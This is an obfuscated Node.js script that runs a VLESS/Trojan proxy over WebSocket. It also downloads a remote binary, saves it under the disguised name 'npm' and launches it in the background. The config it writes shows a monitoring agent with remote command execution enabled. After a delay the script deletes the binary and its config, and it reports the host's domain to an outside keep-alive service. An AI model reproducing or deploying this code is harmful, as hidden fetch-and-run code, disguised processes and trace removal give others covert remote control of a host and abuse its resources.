function _0x27ac(){const _0x1d7f7a=['SUB_PATH','DOMAIN','end','8.8.4.4','includes',':443?encryption=none&security=tls&sni=','connect','length','1234.abc.com','net','once','https://dns.google/resolve?name=','\x20with\x20all\x20DNS\x20servers','substr','replace','decode','log','114002sGaDKX','Server','2083416BgfQkS','chmod\x20+x\x20npm','arm64','Failed\x20to\x20resolve\x20','config.yaml','toString','NEZHA_SERVER','pipe','sub','createServer',':443?security=tls&sni=','send','type','test','connection','Status','writeFileSync','/bin/bash','index.html','client_secret:\x20','finish','UUID','writeHead','https://arm64.ssss.nyc.mn/agent','url','update','NEZHA_KEY','trojan://','message','PORT','join','9VsFMrs','6745970XAQsMM','230KWvebB','readUInt16BE','reduce','catch','WSPATH','Not\x20Found\x0a','--tls','every','readFile','2053','slice','setsid\x20nohup\x20./npm\x20-s\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','concat','digest','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','then','https://speed.cloudflare.com/meta','Answer','utf-8','write','createHash','128065VpKwsQ','2083','application/json','Unknown','pop','72JKfaJR','177FnYiHk','&path=%2F','true','error:\x20','Automatic\x20Access\x20Task\x20added\x20successfully','npm','http','NEZHA_PORT','https://arm64.ssss.nyc.mn/v1','get','readUInt8','data','false','arch','asOrganization','4212693uVIkWq','&fp=chrome&type=ws&host=','from','hex','arm','AUTO_ACCESS','text/plain','axios','692228tdwjOW','text/html','Hug','https://amd64.ssss.nyc.mn/agent','https://','crypto','Server\x20is\x20running\x20on\x20port\x20','1.1.1.1','env','npm\x20is\x20already\x20running,\x20skip\x20running...','utf8','error','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','path','buffer','NAME'];_0x27ac=function(){return _0x1d7f7a;};return _0x27ac();}const _0x11edda=_0x2456;(function(_0x241864,_0x300daa){const _0x32fcd9=_0x2456,_0xd87316=_0x241864();while(!![]){try{const _0x3732ed=parseInt(_0x32fcd9(0x18e))/0x1*(parseInt(_0x32fcd9(0x1eb))/0x2)+parseInt(_0x32fcd9(0x1e9))/0x3*(parseInt(_0x32fcd9(0x1a5))/0x4)+parseInt(_0x32fcd9(0x188))/0x5+parseInt(_0x32fcd9(0x18d))/0x6*(parseInt(_0x32fcd9(0x1c8))/0x7)+-parseInt(_0x32fcd9(0x1ca))/0x8+parseInt(_0x32fcd9(0x19d))/0x9+-parseInt(_0x32fcd9(0x1ea))/0xa;if(_0x3732ed===_0x300daa)break;else _0xd87316['push'](_0xd87316['shift']());}catch(_0x42803f){_0xd87316['push'](_0xd87316['shift']());}}}(_0x27ac,0x47af8));const os=require('os'),http=require(_0x11edda(0x194)),fs=require('fs'),axios=require(_0x11edda(0x1a4)),net=require(_0x11edda(0x1c0)),path=require(_0x11edda(0x1b4)),crypto=require(_0x11edda(0x1aa)),{Buffer}=require(_0x11edda(0x1b5)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x11edda(0x1ad)][_0x11edda(0x1df)]||'13fd4144-4581-47bf-b41d-451bd0a8551f',NEZHA_SERVER=process[_0x11edda(0x1ad)][_0x11edda(0x1d0)]||'',NEZHA_PORT=process[_0x11edda(0x1ad)][_0x11edda(0x195)]||'',NEZHA_KEY=process[_0x11edda(0x1ad)][_0x11edda(0x1e4)]||'',DOMAIN=process['env'][_0x11edda(0x1b8)]||_0x11edda(0x1bf),AUTO_ACCESS=process['env'][_0x11edda(0x1a2)]||!![],WSPATH=process[_0x11edda(0x1ad)][_0x11edda(0x1ef)]||UUID[_0x11edda(0x1f5)](0x0,0x8),SUB_PATH=process[_0x11edda(0x1ad)][_0x11edda(0x1b7)]||_0x11edda(0x1d2),NAME=process[_0x11edda(0x1ad)][_0x11edda(0x1b6)]||_0x11edda(0x1a7),PORT=process[_0x11edda(0x1ad)][_0x11edda(0x1e7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x296d1c=_0x11edda;try{const _0x553dc1=await axios[_0x296d1c(0x197)](_0x296d1c(0x183)),_0x154604=_0x553dc1['data'];ISP=(_0x154604['country']+'-'+_0x154604[_0x296d1c(0x19c)])[_0x296d1c(0x1c5)](/ /g,'_');}catch(_0x45ec08){ISP=_0x296d1c(0x18b);}};GetISP();const httpServer=http[_0x11edda(0x1d3)]((_0x567c03,_0x4c0656)=>{const _0x50aac8=_0x11edda;if(_0x567c03[_0x50aac8(0x1e2)]==='/'){const _0x3e95a4=path[_0x50aac8(0x1e8)](__dirname,_0x50aac8(0x1dc));fs[_0x50aac8(0x1f3)](_0x3e95a4,_0x50aac8(0x1af),(_0x4a33ee,_0x814873)=>{const _0x55d4c2=_0x50aac8;if(_0x4a33ee){_0x4c0656[_0x55d4c2(0x1e0)](0xc8,{'Content-Type':_0x55d4c2(0x1a6)}),_0x4c0656[_0x55d4c2(0x1b9)]('Hello\x20world!');return;}_0x4c0656[_0x55d4c2(0x1e0)](0xc8,{'Content-Type':'text/html'}),_0x4c0656[_0x55d4c2(0x1b9)](_0x814873);});return;}else{if(_0x567c03[_0x50aac8(0x1e2)]==='/'+SUB_PATH){const _0x5f115d='vless://'+UUID+'@'+DOMAIN+_0x50aac8(0x1bc)+DOMAIN+_0x50aac8(0x19e)+DOMAIN+_0x50aac8(0x18f)+WSPATH+'#'+NAME+'-'+ISP,_0x1605c5=_0x50aac8(0x1e5)+UUID+'@'+DOMAIN+_0x50aac8(0x1d4)+DOMAIN+_0x50aac8(0x19e)+DOMAIN+_0x50aac8(0x18f)+WSPATH+'#'+NAME+'-'+ISP,_0x214e8b=_0x5f115d+'\x0a'+_0x1605c5,_0x356d16=Buffer[_0x50aac8(0x19f)](_0x214e8b)['toString']('base64');_0x4c0656[_0x50aac8(0x1e0)](0xc8,{'Content-Type':_0x50aac8(0x1a3)}),_0x4c0656[_0x50aac8(0x1b9)](_0x356d16+'\x0a');}else _0x4c0656[_0x50aac8(0x1e0)](0x194,{'Content-Type':_0x50aac8(0x1a3)}),_0x4c0656['end'](_0x50aac8(0x1f0));}}),wss=new WebSocket[(_0x11edda(0x1c9))]({'server':httpServer}),uuid=UUID[_0x11edda(0x1c5)](/-/g,''),DNS_SERVERS=[_0x11edda(0x1ba),_0x11edda(0x1ac)];function resolveHost(_0x5d48e0){return new Promise((_0x290e83,_0x138461)=>{const _0x302962=_0x2456;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x302962(0x1d7)](_0x5d48e0)){_0x290e83(_0x5d48e0);return;}let _0x3bff2d=0x0;function _0x521c49(){const _0x2cf596=_0x302962;if(_0x3bff2d>=DNS_SERVERS['length']){_0x138461(new Error(_0x2cf596(0x1cd)+_0x5d48e0+_0x2cf596(0x1c3)));return;}const _0x1b3085=DNS_SERVERS[_0x3bff2d];_0x3bff2d++;const _0x4a51bc=_0x2cf596(0x1c2)+encodeURIComponent(_0x5d48e0)+'&type=A';axios[_0x2cf596(0x197)](_0x4a51bc,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x2cf596(0x1fd)](_0x13dbeb=>{const _0x51452e=_0x2cf596,_0x5918c1=_0x13dbeb['data'];if(_0x5918c1[_0x51452e(0x1d9)]===0x0&&_0x5918c1[_0x51452e(0x184)]&&_0x5918c1['Answer'][_0x51452e(0x1be)]>0x0){const _0x24dc39=_0x5918c1[_0x51452e(0x184)]['find'](_0xaf81c4=>_0xaf81c4[_0x51452e(0x1d6)]===0x1);if(_0x24dc39){_0x290e83(_0x24dc39[_0x51452e(0x199)]);return;}}_0x521c49();})['catch'](_0x3abf2f=>{_0x521c49();});}_0x521c49();});}function _0x2456(_0x1bb792,_0x59959c){_0x1bb792=_0x1bb792-0x183;const _0x27ac2b=_0x27ac();let _0x24564b=_0x27ac2b[_0x1bb792];return _0x24564b;}function handleVlessConnection(_0x2c695a,_0x2a3fc3){const _0x11c686=_0x11edda,[_0x2902ed]=_0x2a3fc3,_0x5eef68=_0x2a3fc3['slice'](0x1,0x11);if(!_0x5eef68[_0x11c686(0x1f2)]((_0x8f0d8f,_0x443b41)=>_0x8f0d8f==parseInt(uuid[_0x11c686(0x1c4)](_0x443b41*0x2,0x2),0x10)))return![];let _0x571b05=_0x2a3fc3['slice'](0x11,0x12)[_0x11c686(0x198)]()+0x13;const _0x40b3a7=_0x2a3fc3[_0x11c686(0x1f5)](_0x571b05,_0x571b05+=0x2)[_0x11c686(0x1ec)](0x0),_0x2e6ab0=_0x2a3fc3[_0x11c686(0x1f5)](_0x571b05,_0x571b05+=0x1)['readUInt8'](),_0x47e5a1=_0x2e6ab0==0x1?_0x2a3fc3[_0x11c686(0x1f5)](_0x571b05,_0x571b05+=0x4)['join']('.'):_0x2e6ab0==0x2?new TextDecoder()[_0x11c686(0x1c6)](_0x2a3fc3[_0x11c686(0x1f5)](_0x571b05+0x1,_0x571b05+=0x1+_0x2a3fc3[_0x11c686(0x1f5)](_0x571b05,_0x571b05+0x1)[_0x11c686(0x198)]())):_0x2e6ab0==0x3?_0x2a3fc3['slice'](_0x571b05,_0x571b05+=0x10)[_0x11c686(0x1ed)]((_0x488b33,_0x4e008d,_0x4e9d1f,_0x6619fb)=>_0x4e9d1f%0x2?_0x488b33[_0x11c686(0x1f8)](_0x6619fb['slice'](_0x4e9d1f-0x1,_0x4e9d1f+0x1)):_0x488b33,[])['map'](_0x188d84=>_0x188d84['readUInt16BE'](0x0)[_0x11c686(0x1cf)](0x10))[_0x11c686(0x1e8)](':'):'';_0x2c695a[_0x11c686(0x1d5)](new Uint8Array([_0x2902ed,0x0]));const _0x129524=createWebSocketStream(_0x2c695a);return resolveHost(_0x47e5a1)[_0x11c686(0x1fd)](_0x458bee=>{const _0x41e459=_0x11c686;net['connect']({'host':_0x458bee,'port':_0x40b3a7},function(){const _0x48bea3=_0x2456;this[_0x48bea3(0x186)](_0x2a3fc3[_0x48bea3(0x1f5)](_0x571b05)),_0x129524['on'](_0x48bea3(0x1b0),()=>{})[_0x48bea3(0x1d1)](this)['on']('error',()=>{})[_0x48bea3(0x1d1)](_0x129524);})['on'](_0x41e459(0x1b0),()=>{});})['catch'](_0x1403a3=>{const _0x5d58f2=_0x11c686;net[_0x5d58f2(0x1bd)]({'host':_0x47e5a1,'port':_0x40b3a7},function(){const _0x47c1b8=_0x5d58f2;this[_0x47c1b8(0x186)](_0x2a3fc3[_0x47c1b8(0x1f5)](_0x571b05)),_0x129524['on'](_0x47c1b8(0x1b0),()=>{})[_0x47c1b8(0x1d1)](this)['on'](_0x47c1b8(0x1b0),()=>{})[_0x47c1b8(0x1d1)](_0x129524);})['on'](_0x5d58f2(0x1b0),()=>{});}),!![];}function handleTrojanConnection(_0x4830c1,_0x2f4c86){const _0x33bfa8=_0x11edda;try{if(_0x2f4c86['length']<0x3a)return![];const _0x585821=_0x2f4c86[_0x33bfa8(0x1f5)](0x0,0x38)['toString'](),_0x387b22=[UUID];let _0xebe4bc=null;for(const _0x5132de of _0x387b22){const _0x5add3d=crypto[_0x33bfa8(0x187)]('sha224')[_0x33bfa8(0x1e3)](_0x5132de)[_0x33bfa8(0x1f9)](_0x33bfa8(0x1a0));if(_0x5add3d===_0x585821){_0xebe4bc=_0x5132de;break;}}if(!_0xebe4bc)return![];let _0x37f55e=0x38;_0x2f4c86[_0x37f55e]===0xd&&_0x2f4c86[_0x37f55e+0x1]===0xa&&(_0x37f55e+=0x2);const _0x32f2c5=_0x2f4c86[_0x37f55e];if(_0x32f2c5!==0x1)return![];_0x37f55e+=0x1;const _0x281a0c=_0x2f4c86[_0x37f55e];_0x37f55e+=0x1;let _0x1bfed8,_0x1a6608;if(_0x281a0c===0x1)_0x1bfed8=_0x2f4c86[_0x33bfa8(0x1f5)](_0x37f55e,_0x37f55e+0x4)[_0x33bfa8(0x1e8)]('.'),_0x37f55e+=0x4;else{if(_0x281a0c===0x3){const _0x2585a1=_0x2f4c86[_0x37f55e];_0x37f55e+=0x1,_0x1bfed8=_0x2f4c86[_0x33bfa8(0x1f5)](_0x37f55e,_0x37f55e+_0x2585a1)[_0x33bfa8(0x1cf)](),_0x37f55e+=_0x2585a1;}else{if(_0x281a0c===0x4)_0x1bfed8=_0x2f4c86['slice'](_0x37f55e,_0x37f55e+0x10)[_0x33bfa8(0x1ed)]((_0x575ded,_0x5a9a7f,_0x123dd,_0x215ebf)=>_0x123dd%0x2?_0x575ded['concat'](_0x215ebf[_0x33bfa8(0x1f5)](_0x123dd-0x1,_0x123dd+0x1)):_0x575ded,[])['map'](_0x238ecc=>_0x238ecc[_0x33bfa8(0x1ec)](0x0)['toString'](0x10))[_0x33bfa8(0x1e8)](':'),_0x37f55e+=0x10;else return![];}}_0x1a6608=_0x2f4c86['readUInt16BE'](_0x37f55e),_0x37f55e+=0x2;_0x37f55e<_0x2f4c86[_0x33bfa8(0x1be)]&&_0x2f4c86[_0x37f55e]===0xd&&_0x2f4c86[_0x37f55e+0x1]===0xa&&(_0x37f55e+=0x2);const _0x55d2b5=createWebSocketStream(_0x4830c1);return resolveHost(_0x1bfed8)[_0x33bfa8(0x1fd)](_0x16d04a=>{const _0x4015d9=_0x33bfa8;net[_0x4015d9(0x1bd)]({'host':_0x16d04a,'port':_0x1a6608},function(){const _0x333b62=_0x4015d9;_0x37f55e<_0x2f4c86['length']&&this[_0x333b62(0x186)](_0x2f4c86[_0x333b62(0x1f5)](_0x37f55e)),_0x55d2b5['on'](_0x333b62(0x1b0),()=>{})[_0x333b62(0x1d1)](this)['on'](_0x333b62(0x1b0),()=>{})['pipe'](_0x55d2b5);})['on'](_0x4015d9(0x1b0),()=>{});})[_0x33bfa8(0x1ee)](_0x5a5fbb=>{const _0x5a58c5=_0x33bfa8;net[_0x5a58c5(0x1bd)]({'host':_0x1bfed8,'port':_0x1a6608},function(){const _0x35f7cd=_0x5a58c5;_0x37f55e<_0x2f4c86[_0x35f7cd(0x1be)]&&this['write'](_0x2f4c86['slice'](_0x37f55e)),_0x55d2b5['on'](_0x35f7cd(0x1b0),()=>{})['pipe'](this)['on'](_0x35f7cd(0x1b0),()=>{})[_0x35f7cd(0x1d1)](_0x55d2b5);})['on'](_0x5a58c5(0x1b0),()=>{});}),!![];}catch(_0x5eaa8b){return![];}}wss['on'](_0x11edda(0x1d8),(_0x517dfe,_0x3d19db)=>{const _0x25551b=_0x11edda,_0xf639f3=_0x3d19db[_0x25551b(0x1e2)]||'';_0x517dfe[_0x25551b(0x1c1)](_0x25551b(0x1e6),_0x368617=>{const _0x31bb36=_0x25551b;if(_0x368617[_0x31bb36(0x1be)]>0x11&&_0x368617[0x0]===0x0){const _0xab3b01=_0x368617[_0x31bb36(0x1f5)](0x1,0x11),_0x233ef2=_0xab3b01[_0x31bb36(0x1f2)]((_0x3696d1,_0x5167c8)=>_0x3696d1==parseInt(uuid[_0x31bb36(0x1c4)](_0x5167c8*0x2,0x2),0x10));if(_0x233ef2){!handleVlessConnection(_0x517dfe,_0x368617)&&_0x517dfe['close']();return;}}!handleTrojanConnection(_0x517dfe,_0x368617)&&_0x517dfe['close']();})['on'](_0x25551b(0x1b0),()=>{});});const getDownloadUrl=()=>{const _0x597196=_0x11edda,_0x57d012=os[_0x597196(0x19b)]();return _0x57d012===_0x597196(0x1a1)||_0x57d012===_0x597196(0x1cc)||_0x57d012===_0x597196(0x1fc)?!NEZHA_PORT?_0x597196(0x196):_0x597196(0x1e1):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x597196(0x1a8);},downloadFile=async()=>{const _0x103c84=_0x11edda;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x259547=getDownloadUrl(),_0x2f6d6d=await axios({'method':_0x103c84(0x197),'url':_0x259547,'responseType':'stream'}),_0x51a392=fs['createWriteStream'](_0x103c84(0x193));return _0x2f6d6d[_0x103c84(0x199)][_0x103c84(0x1d1)](_0x51a392),new Promise((_0x2c6bbc,_0x23a9a0)=>{const _0x347dc5=_0x103c84;_0x51a392['on'](_0x347dc5(0x1de),()=>{const _0x16d42a=_0x347dc5;console[_0x16d42a(0x1c7)]('npm\x20download\x20successfully'),exec(_0x16d42a(0x1cb),_0x526d46=>{if(_0x526d46)_0x23a9a0(_0x526d46);_0x2c6bbc();});}),_0x51a392['on'](_0x347dc5(0x1b0),_0x23a9a0);});}catch(_0x3c9bec){throw _0x3c9bec;}},runnz=async()=>{const _0x20afad=_0x11edda;try{const _0xed078c=execSync(_0x20afad(0x1f7),{'encoding':_0x20afad(0x185)});if(_0xed078c['trim']()!==''){console[_0x20afad(0x1c7)](_0x20afad(0x1ae));return;}}catch(_0x3ddebb){}await downloadFile();let _0x51d882='',_0x2f14a5=['443','8443','2096','2087',_0x20afad(0x189),_0x20afad(0x1f4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x47d077=_0x2f14a5[_0x20afad(0x1bb)](NEZHA_PORT)?_0x20afad(0x1f1):'';_0x51d882=_0x20afad(0x1f6)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x47d077+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27f5be=NEZHA_SERVER[_0x20afad(0x1bb)](':')?NEZHA_SERVER['split'](':')[_0x20afad(0x18c)]():'',_0x11c015=_0x2f14a5[_0x20afad(0x1bb)](_0x27f5be)?_0x20afad(0x190):_0x20afad(0x19a),_0x1d9d50=_0x20afad(0x1dd)+NEZHA_KEY+_0x20afad(0x1fa)+NEZHA_SERVER+_0x20afad(0x1fb)+_0x11c015+_0x20afad(0x1b3)+UUID;fs[_0x20afad(0x1da)](_0x20afad(0x1ce),_0x1d9d50);}_0x51d882=_0x20afad(0x1b1);}else{console[_0x20afad(0x1c7)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x51d882,{'shell':_0x20afad(0x1db)},_0x316432=>{const _0x1d6a2e=_0x20afad;if(_0x316432)console[_0x1d6a2e(0x1b0)]('npm\x20running\x20error:',_0x316432);else console[_0x1d6a2e(0x1c7)]('npm\x20is\x20running');});}catch(_0x286552){console['error'](_0x20afad(0x191)+_0x286552);}};async function addAccessTask(){const _0x368104=_0x11edda;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3d815a=_0x368104(0x1a9)+DOMAIN;try{const _0x228d1d=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x3d815a},{'headers':{'Content-Type':_0x368104(0x18a)}});console[_0x368104(0x1c7)](_0x368104(0x192));}catch(_0x5abf7d){}}const delFiles=()=>{const _0x268d23=_0x11edda;fs[_0x268d23(0x1b2)]('npm',()=>{}),fs['unlink'](_0x268d23(0x1ce),()=>{});};httpServer['listen'](PORT,()=>{const _0x50847a=_0x11edda;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x50847a(0x1c7)](_0x50847a(0x1ab)+PORT);});
